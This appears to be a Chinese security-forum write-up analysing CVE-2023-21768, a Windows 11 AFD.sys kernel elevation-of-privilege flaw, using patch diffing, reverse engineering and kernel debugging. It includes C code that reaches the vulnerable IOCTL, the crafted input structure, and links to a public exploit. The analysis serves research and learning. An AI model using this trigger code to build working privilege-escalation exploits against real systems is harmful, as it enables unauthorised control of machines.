
### 提权结果

调试就根据自己编写代码时去调试了，主要是看 `_IORING_OBJECT` 这个内核结构体的那两个成员是否写成功。

运行 exp 结果如下。

![20.png](upload/attach/202402/926755_65WWXAD3DW35ES4.jpg)

## 参考

<mark class="encrypted">4a5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6k6h3y4#2M7X3W2@1P5h3W2F1N6r3g2D9L8r3W2Y4k6h3&6U0k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8K6i4K6u0r3M7r3q4@1j5$3S2Q4x3X3c8@1N6h3g2K6k6r3q4&6i4K6u0V1k6i4S2H3L8r3!0A6N6q4)9J5k6s2N6W2k6r3&6W2M7$3c8S2P5g2)9J5k6s2m8%4L8X3W2F1k6#2)9J5k6s2N6A6L8X3c8G2N6%4y4Q4x3X3c8S2L8X3y4A6L8r3I4S2M7Y4W2Q4x3X3c8X3N6h3&6U0N6r3W2G2L8W2)9J5k6r3c8J5K9i4k6W2M7W2)9J5k6s2N6A6L8Y4y4G2j5$3E0Q4x3V1j5`.</mark>
<a href="elink@351K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0M7%4u0U0i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3N6i4m8V1j5i4c8W2i4K6u0V1k6%4g2A6k6r3g2Q4x3V1k6W2L8W2)9J5k6q4g2e0i4K6u0r3N6Y4g2D9L8X3g2J5j5h3u0A6L8r3W2@1P5g2)9J5c8V1y4h3c8g2)9J5k6o6t1H3x3U0y4Q4x3X3b7J5x3e0M7$3z5l9`.`.">CVE-2023-21768 - Security Update Guide - Microsoft - Windows Ancillary Function Driver for WinSock Elevation of Privilege Vulnerability</a>
<a href="elink@859K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4q4I4i4K6g2X3y4e0x3K6x3U0b7^5x3K6y4Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3k6r3g2@1j5h3W2D9M7#2)9J5c8U0p5J5x3o6R3I4y4e0b7H3y4H3`.`.">(58条消息) VMware虚拟机安装Win11教程（解决常见报错）_TheITSea的博客-CSDN博客</a>
<a href="elink@e9eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6^5k6X3!0J5j5$3g2J5k6h3c8Q4x3V1k6i4K9h3&6V1L8%4N6K6i4K6g2X3e0q4m8q4i4K6g2X3b7f1k6p5i4K6g2X3b7#2k6q4i4K6u0V1x3U0l9J5x3#2)9J5k6o6t1I4y4K6j5^5">GitHub - xforcered/Windows_LPE_AFD_CVE-2023-21768: LPE exploit for CVE-2023-21768</a>

# CVE-2023-21768 Windows内核提权漏洞

## 简介

对最近的一个 Windows 提权洞进行分析，漏洞点不是很难，相比于之前分析的 `CVE-2021-1732`，过程还简单一些，主要是学习 I/O Ring 这种读写原语，感觉后续微软可能会对 I/O Ring 的预注册输出缓冲区进行一些调整修改。还有就是分析过程中，结合 chatGPT，感觉是一个不错的方法。

## 环境搭建

实验环境

- Windows 11 22H2
- windbg
- Visual Studio 2022

镜像下载：`ed2k://|file|zh-cn_windows_11_consumer_editions_version_22h2_updated_nov_2022_x64_dvd_2c7e96c3.iso|5673539584|EB8FF2B481BB6AFE71B2784C6485733B|/`

安装镜像就不用多说，网上教程很多，这里需要注意的是 exp 的编译，由于提权过程中使用到的某些技术，我们需要 `Visual Studio 2022`，并且安装较高版本的 win11 SDK，我这里是 `Windows 11 SDK (10.0.22621.0)`

环境搭建好之后，先用编译好的 exp 进行测试一下。

![1.png](https://bbs.kanxue.com/upload/attach/202402/926755_TX4E8CAQ9TMMG87.jpg)

## 漏洞原理

漏洞点在 `AFD.sys` 这个驱动中，简单了解下 `AFD.sys`，问问 chatGPT。

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8 | `AFD.sys是Windows操作系统中的一个系统文件，是关于网络协议的文件，主要负责Winsock核心服务的实现和运行。Winsock是Windows下网络协议的一个API，通过它应用程序可以访问网络，AFD.sys则是其中实现的核心服务。具体来说，它提供了以下功能：`    `1.` `网络数据的传输和接收；`  `2.` `网络套接字的创建、连接、监听等操作；`  `3.` `实现了对TCP``/``IP和UDP``/``IP等网络协议的支持；`  `4.` `管理和维护网络缓存。`    `简而言之，AFD.sys是Windows网络协议栈的一个核心部分，负责管理和协调网络通信的各项操作。` |

根据后面的分析来看，简单讲就是 `AFD.sys` 的一个函数 `afd!AfdNotifyRemoveIoCompletion` 中出现了漏洞，存在我们可控制的变量，并且还有赋值操作，当我们构造的变量是一个地址的话，就可以将想设置的值赋值到对应的地址空间中，当然想进一步利用，实现提权，还需要其他的技术。

### 补丁对比

我们将打补丁前后的文件进行对比，找出打补丁的位置。

- `AFD.sys` / Windows 11 22H2 / 10.0.22621.608 (December 2022)
- `AFD.sys` / Windows 11 22H2 / 10.0.22621.1105 (January 2023)

只不过感觉实际上对比补丁貌似也是个体力活，里面实际上有很多0.99的，可能也不是那么容易找到修改的地方。

![2.png](https://bbs.kanxue.com/upload/attach/202402/926755_KRXT7VV347YPKSU.jpg)

`diaphora` 对比一下反编译出来的伪代码，貌似 `diaphora` 可以直接将它认为有区别的函数自动提取出来。

![3.png](https://bbs.kanxue.com/upload/attach/202402/926755_NZD9PTB4S5AVFM5.jpg)

可以看到在进行赋值前，添加了 `ProbeForWrite` 函数，来检测目标地址是否可访问，所以这里应该就是漏洞点了。

### 逆向工程

这里可能需要先提前去了解有点驱动如何编写自定义的派遣函数。

要利用这个漏洞，首先我们需要知道如何到达漏洞点，通过交叉引用，可以发现调用链是这样的 `AfdFastIoDeviceControl-->AfdNotifySock-->AfdNotifyRemoveIoCompletion()`

关键是搞懂 `AfdFastIoDeviceControl-->AfdNotifySock`，我们对 `AfdNotifySock` 进行交叉引用，会发现两个表，`AfdImmediateCallDispatch` 和 `AfdIrpCallDispatch`，这两个表里面的函数都是 AFD 驱动程序的调度函数。

![4.png](https://bbs.kanxue.com/upload/attach/202402/926755_AYQ4BTU5HT6ST77.jpg)

接着对 `AfdImmediateCallDispatch` 进行交叉引用，我们将在 `AfdFastIoDeviceControl()` 函数中看到下面的代码，实际上对 `AfdIrpCallDispatch` 进行交叉引用，也会在其对应的函数看到类似的代码。

![5.png](https://bbs.kanxue.com/upload/attach/202402/926755_TWCZUGJ2PPT2FCA.jpg)

所以我们可以通过代码中的 `AfdIoctlTable` 去获取自定义的控制信号，前面我们已经知道 `AfdNotifySock` 在 `AfdImmediateCallDispatch` 表中的下标是 73，通过下面的图片可以知道对应的控制信号是 `12127h`。

![6.png](https://bbs.kanxue.com/upload/attach/202402/926755_NY5J4SQKDXQ435T.jpg)

知道了控制信号是 `12127h`，获取我们可以在用户层调用 `DeviceIoControl` 来访问到这个函数。

庆幸的是 `x86matthew` 曾经发布了一些代码，其原本是绕过 Winsock 的 API 函数，采用 `NtCreateFile` 和 `NtDeviceIoControlFile` 来进行 AFD 驱动程序通信，目的为了网络通信的隐蔽性，不容易被检测，但是我们可以借鉴里面的一些代码，方便我们调试 `AfdIoctlTable`，了解如何触发漏洞。

### afd!AfdIoctlTable 调试

我们的目的是需要搞明白，如何才能到达漏洞点。

编写的测试代码如下，由于我们不知道传入数据是啥，所以直接传入一些字符串 `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLL`

```
#include<Windows.h>
struct IO_STATUS_BLOCK
{
union
{
DWORD Status;
PVOID Pointer;
};

DWORD* Information;
};

struct UNICODE_STRING
{
USHORT Length;
USHORT MaximumLength;
PWSTR Buffer;
};

struct OBJECT_ATTRIBUTES
{
ULONG Length;
HANDLE RootDirectory;
UNICODE_STRING* ObjectName;
ULONG Attributes;
PVOID SecurityDescriptor;
PVOID SecurityQualityOfService;
};

DWORD(WINAPI* NtDeviceIoControlFile)(HANDLE FileHandle, HANDLE Event, VOID* ApcRoutine, PVOID ApcContext, IO_STATUS_BLOCK* IoStatusBlock, ULONG IoControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength);
DWORD(WINAPI* NtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, OBJECT_ATTRIBUTES* ObjectAttributes, IO_STATUS_BLOCK* IoStatusBlock, LARGE_INTEGER* AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);

#define AFD_NOTIFYSOCK_IOCTL 0x12127

int main()
{
/* get NtDeviceIoControlFile function ptr */
NtDeviceIoControlFile = (unsigned long(__stdcall*)(void*, void*, void*, void*, struct IO_STATUS_BLOCK*, unsigned long, void*, unsigned long, void*, unsigned long))GetProcAddress(GetModuleHandle("ntdll.dll"), "NtDeviceIoControlFile");
if (NtDeviceIoControlFile == NULL)
{
return 1;
}

/* get NtCreateFile function ptr */
NtCreateFile = (unsigned long(__stdcall*)(void**, unsigned long, struct OBJECT_ATTRIBUTES*, struct IO_STATUS_BLOCK*, union _LARGE_INTEGER*, unsigned long, unsigned long, unsigned long, unsigned long, void*, unsigned long))GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateFile");
if (NtCreateFile == NULL)
{
return 1;
}

IO_STATUS_BLOCK IoStatusBlock;
HANDLE hEvent = NULL;
HANDLE hSocket = NULL;
OBJECT_ATTRIBUTES ObjectAttributes;
UNICODE_STRING ObjectFilePath;
DWORD dwStatus = 0;
BYTE bExtendedAttributes[] =
{
0x00,0x00,0x00,0x00,0x00,0x0F,0x1E,0x00,0x41,0x66,0x64,0x4F,0x70,0x65,0x6E,0x50,
0x61,0x63,0x6B,0x65,0x74,0x58,0x58,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x60,0xEF,0x3D,0x47,0xFE
};

char Data[0x30] = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLL";

/* create status event */
hEvent = CreateEvent(NULL,0,0,NULL);
if (hEvent == NULL)
{
/* error */
return 1;
}

/* set afd endpoint path */
memset((void*)&ObjectFilePath,0,sizeof(ObjectFilePath));
ObjectFilePath.Buffer = (PWSTR)L"\\Device\\Afd\\Endpoint";
ObjectFilePath.Length = wcslen(ObjectFilePath.Buffer) * sizeof(wchar_t);
ObjectFilePath.MaximumLength = ObjectFilePath.Length;

/* initialise object attributes */
memset((void*)&ObjectAttributes,0,sizeof(ObjectAttributes));
ObjectAttributes.Length = sizeof(ObjectAttributes);
ObjectAttributes.ObjectName = &ObjectFilePath;
ObjectAttributes.Attributes = 0x40;

/* create socket handle */
IoStatusBlock.Status = 0;
IoStatusBlock.Information = NULL;
dwStatus = NtCreateFile(&hSocket, MAXIMUM_ALLOWED, &ObjectAttributes, &IoStatusBlock, NULL,0, FILE_SHARE_READ | FILE_SHARE_WRITE,1,0, bExtendedAttributes, sizeof(bExtendedAttributes));
if (dwStatus != 0)
{
/* error */
CloseHandle(hEvent);

return 1;
}

/*
__kernel_entry NTSYSCALLAPI NTSTATUS NtDeviceIoControlFile(
[in]            HANDLE           FileHandle,
[in, optional]  HANDLE           Event,
[in, optional]  PIO_APC_ROUTINE  ApcRoutine,
[in, optional]  PVOID            ApcContext,
[out]           PIO_STATUS_BLOCK IoStatusBlock,
[in]            ULONG            IoControlCode,
[in, optional]  PVOID            InputBuffer,
[in]            ULONG            InputBufferLength,
[out, optional] PVOID            OutputBuffer,
[in]            ULONG            OutputBufferLength
);
*/
NtDeviceIoControlFile(hSocket, hEvent, NULL, NULL, &IoStatusBlock, AFD_NOTIFYSOCK_IOCTL, &Data,0x30, NULL,0);

if (INVALID_HANDLE_VALUE != hSocket)
{
CloseHandle(hSocket);
}

if (NULL != hEvent)
{
CloseHandle(hEvent);
}
}
```

在 `afd!AfdNotifySock` 打上断点，断下来，`r9` 寄存器指向我们的输入。

![7.png](https://bbs.kanxue.com/upload/attach/202402/926755_KUCCGUMUCXA4MKC.jpg)

接下来是第一个判断

```
if ( InputBufferLength != 0x30 || OutputBufferLength )
{
v10 = 0xC0000004;
goto LABEL_45; /* bad */
}
if ( OutputBuffer )
goto LABEL_5; /* bad */
```

所以需要满足

- `InputBufferLength == 0x30`
- `OutputBufferLength==0`
- `OutputBuffer==0`

继续调试，发现对 `InputBuffer` 的一些值进行了判断，并且将 `*(void **)_InputBuffer` 传入了 `ObReferenceObjectByHandle()` 函数。

![8.png](https://bbs.kanxue.com/upload/attach/202402/926755_2YV6DHZPRBAK9KP.jpg)

不要完全相信反编译的伪代码，其中的一些偏移可能是错误的，最好还是看汇编，或者重新修改一下变量类型，修改为 byte，效果如下。

```
if ( !*(_DWORD *)(*(_QWORD *)&_InputBuffer + 32i64) )
goto bad1;
if ( *(_DWORD *)(*(_QWORD *)&_InputBuffer + 0x28i64) )
{
if ( !*(_QWORD *)(*(_QWORD *)&_InputBuffer + 24i64) || !*(_QWORD *)(*(_QWORD *)&_InputBuffer + 16i64) )
goto bad1;
}
else if ( *(_QWORD *)(*(_QWORD *)&_InputBuffer + 16i64) ||
*(_DWORD *)(*(_QWORD *)&_InputBuffer + 36i64) )
{
bad1:
ret = 0xC000000D;
goto bad;
}
```

所以我们需要对 `InputBuffer` 的一些值进行设置，最好是搞个结构体，通过整个函数中出现 `InputBuffer`，可得到下面的结构体，我们可以将其导入 ida，让伪代码更加清晰。

```
typedef struct AFD_NOTIFYSOCK_DATA
{
HANDLE HandleIoCompletion;
PVOID pData1;
PVOID pData2;
PVOID pPwnPtr;
DWORD dwCounter;
DWORD dwTimeout;
DWORD dwLen;
char lol[0x4];
}AFD_NOTIFYSOCK_DATA;
```

绕过 if 的一些值的判断是简单的，重点是如何绕过 `ObReferenceObjectByHandle()`，其返回值必须>=0，这里可以去问问 chatGPT，大部分情况下，可以提供非常有效的帮助。

```
问：如果第三个参数是IoCompletionObjectType呢 这个对象类型的句柄可以调用什么函数来创建
答：IO完成对象是Windows内核中的一种同步机制，它用于通知应用程序有关操作完成的消息。IO完成对象是由操作系统内核自动创建和管理的，因此没有专门的函数来创建它们。在Windows操作系统中，可以使用CreateIoCompletionPort函数将IO完成端口与文件句柄关联，从而将IO操作通知到IO完成对象中。关联之后，可以使用GetQueuedCompletionStatus函数等待IO完成对象，以获取IO操作完成的状态和相关数据。因此，IO完成对象的句柄实际上是IO完成端口的句柄，可以使用CreateIoCompletionPort函数创建。

CreateIoCompletionPort是Win32 API之一，底层实现是由Windows内核的NTOSKRNL.EXE模块提供支持，具体实现可参考Windows Driver Kit(WDK)提供的内核模式驱动开发文档。其底层函数是NtCreateIoCompletion，该函数是内核发起IO请求的函数之一，用于创建IO完成端口对象并返回其句柄。它的定义如下：

```C
NTSYSAPI
NTSTATUS
NTAPI
NtCreateIoCompletion(
_Out_ PHANDLE IoCompletionHandle,
_In_ ACCESS_MASK DesiredAccess,
_In_ POBJECT_ATTRIBUTES ObjectAttributes,
_In_ ULONG NumberOfConcurrentThreads
);
```

其中，
- IoCompletionHandle：用于返回IO完成端口对象的句柄。
- DesiredAccess：指定IO完成端口对象的访问权限。
- ObjectAttributes：用于指定IO完成端口对象的名称及其属性。
- NumberOfConcurrentThreads：指定IO请求的并发线程数。
```
